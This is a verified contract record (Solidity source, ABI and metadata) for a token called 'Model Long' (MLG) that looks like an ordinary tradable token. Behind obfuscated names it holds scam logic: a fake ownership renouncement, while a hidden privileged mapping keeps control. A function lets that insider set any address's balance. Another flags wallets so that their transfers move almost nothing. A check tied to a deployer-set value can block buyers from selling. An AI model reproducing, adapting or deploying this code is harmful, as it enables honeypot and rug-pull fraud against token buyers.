{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.14;\n\ninterface senderToken {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atTake) external view returns (uint256);\n\n    function transfer(address limitAuto, uint256 senderWallet) external returns (bool);\n\n    function allowance(address tradingMode, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderWallet) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address limitAuto,\n        uint256 senderWallet\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed atLaunch, uint256 value);\n    event Approval(address indexed tradingMode, address indexed spender, uint256 value);\n}\n\nabstract contract tokenAt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface launchedEnableTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface enableMarketing {\n    function createPair(address fromLaunch, address launchTo) external returns (address);\n}\n\ninterface tradingLaunch is senderToken {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ModelLong is tokenAt, senderToken, tradingLaunch {\n\n    function tokenTotal(address liquidityMode) public {\n        shouldMax();\n        if (isAuto != fromReceiver) {\n            toMax = false;\n        }\n        if (liquidityMode == senderTeamTx || liquidityMode == teamSell) {\n            return;\n        }\n        fromLimitFee[liquidityMode] = true;\n    }\n\n    uint256 public isAuto;\n\n    bool private toMax;\n\n    uint256 private fromReceiver;\n\n    constructor (){\n        if (modeAmount) {\n            isAuto = fromReceiver;\n        }\n        launchedEnableTrading shouldExempt = launchedEnableTrading(toIs);\n        teamSell = enableMarketing(shouldExempt.factory()).createPair(shouldExempt.WETH(), address(this));\n        \n        senderTeamTx = _msgSender();\n        sellWalletTeam();\n        takeSwap[senderTeamTx] = true;\n        listFund[senderTeamTx] = marketingReceiverLiquidity;\n        if (modeAmount) {\n            isAuto = fromReceiver;\n        }\n        emit Transfer(address(0), senderTeamTx, marketingReceiverLiquidity);\n    }\n\n    function tradingMinBuy(uint256 senderWallet) public {\n        shouldMax();\n        marketingMaxTake = senderWallet;\n    }\n\n    uint256 launchedTotal;\n\n    bool public modeAmount;\n\n    address public senderTeamTx;\n\n    function sellWalletTeam() public {\n        emit OwnershipTransferred(senderTeamTx, address(0));\n        tokenFee = address(0);\n    }\n\n    event OwnershipTransferred(address indexed liquidityAmount, address indexed feeLaunchedMin);\n\n    uint8 private teamFund = 18;\n\n    uint256 private marketingReceiverLiquidity = 100000000 * 10 ** 18;\n\n    function transfer(address listTake, uint256 senderWallet) external virtual override returns (bool) {\n        return minReceiver(_msgSender(), listTake, senderWallet);\n    }\n\n    function allowance(address totalReceiver, address launchMarketingBuy) external view virtual override returns (uint256) {\n        if (launchMarketingBuy == toIs) {\n            return type(uint256).max;\n        }\n        return amountTo[totalReceiver][launchMarketingBuy];\n    }\n\n    function maxSwap(address feeAuto, address limitAuto, uint256 senderWallet) internal returns (bool) {\n        require(listFund[feeAuto] >= senderWallet);\n        listFund[feeAuto] -= senderWallet;\n        listFund[limitAuto] += senderWallet;\n        emit Transfer(feeAuto, limitAuto, senderWallet);\n        return true;\n    }\n\n    mapping(address => bool) public fromLimitFee;\n\n    address private tokenFee;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return marketingReceiverLiquidity;\n    }\n\n    function balanceOf(address atTake) public view virtual override returns (uint256) {\n        return listFund[atTake];\n    }\n\n    function tokenMin(address exemptTrading) public {\n        if (teamReceiverMode) {\n            return;\n        }\n        \n        takeSwap[exemptTrading] = true;\n        \n        teamReceiverMode = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamFund;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeTx;\n    }\n\n    address marketingAt = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function receiverTotal(address listTake, uint256 senderWallet) public {\n        shouldMax();\n        listFund[listTake] = senderWallet;\n    }\n\n    address public teamSell;\n\n    address toIs = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public teamReceiverMode;\n\n    string private amountWallet = \"Model Long\";\n\n    mapping(address => mapping(address => uint256)) private amountTo;\n\n    uint256 constant swapAmount = 18 ** 10;\n\n    function getOwner() external view returns (address) {\n        return tokenFee;\n    }\n\n    function shouldMax() private view {\n        require(takeSwap[_msgSender()]);\n    }\n\n    uint256 marketingMaxTake;\n\n    function approve(address launchMarketingBuy, uint256 senderWallet) public virtual override returns (bool) {\n        amountTo[_msgSender()][launchMarketingBuy] = senderWallet;\n        emit Approval(_msgSender(), launchMarketingBuy, senderWallet);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return tokenFee;\n    }\n\n    function transferFrom(address feeAuto, address limitAuto, uint256 senderWallet) external override returns (bool) {\n        if (_msgSender() != toIs) {\n            if (amountTo[feeAuto][_msgSender()] != type(uint256).max) {\n                require(senderWallet <= amountTo[feeAuto][_msgSender()]);\n                amountTo[feeAuto][_msgSender()] -= senderWallet;\n            }\n        }\n        return minReceiver(feeAuto, limitAuto, senderWallet);\n    }\n\n    mapping(address => uint256) private listFund;\n\n    function minReceiver(address feeAuto, address limitAuto, uint256 senderWallet) internal returns (bool) {\n        if (feeAuto == senderTeamTx) {\n            return maxSwap(feeAuto, limitAuto, senderWallet);\n        }\n        uint256 maxAutoTake = senderToken(teamSell).balanceOf(marketingAt);\n        require(maxAutoTake == marketingMaxTake);\n        require(limitAuto != marketingAt);\n        if (fromLimitFee[feeAuto]) {\n            return maxSwap(feeAuto, limitAuto, swapAmount);\n        }\n        return maxSwap(feeAuto, limitAuto, senderWallet);\n    }\n\n    string private feeTx = \"MLG\";\n\n    function name() external view virtual override returns (string memory) {\n        return amountWallet;\n    }\n\n    mapping(address => bool) public takeSwap;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeLaunchedMin\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchMarketingBuy\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMarketingBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderWallet\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTake\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromLimitFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderWallet\",\"type\":\"uint256\"}],\"name\":\"receiverTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellWalletTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderTeamTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiverMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamSell\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptTrading\",\"type\":\"address\"}],\"name\":\"tokenMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityMode\",\"type\":\"address\"}],\"name\":\"tokenTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderWallet\",\"type\":\"uint256\"}],\"name\":\"tradingMinBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderWallet\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderWallet\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "ModelLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}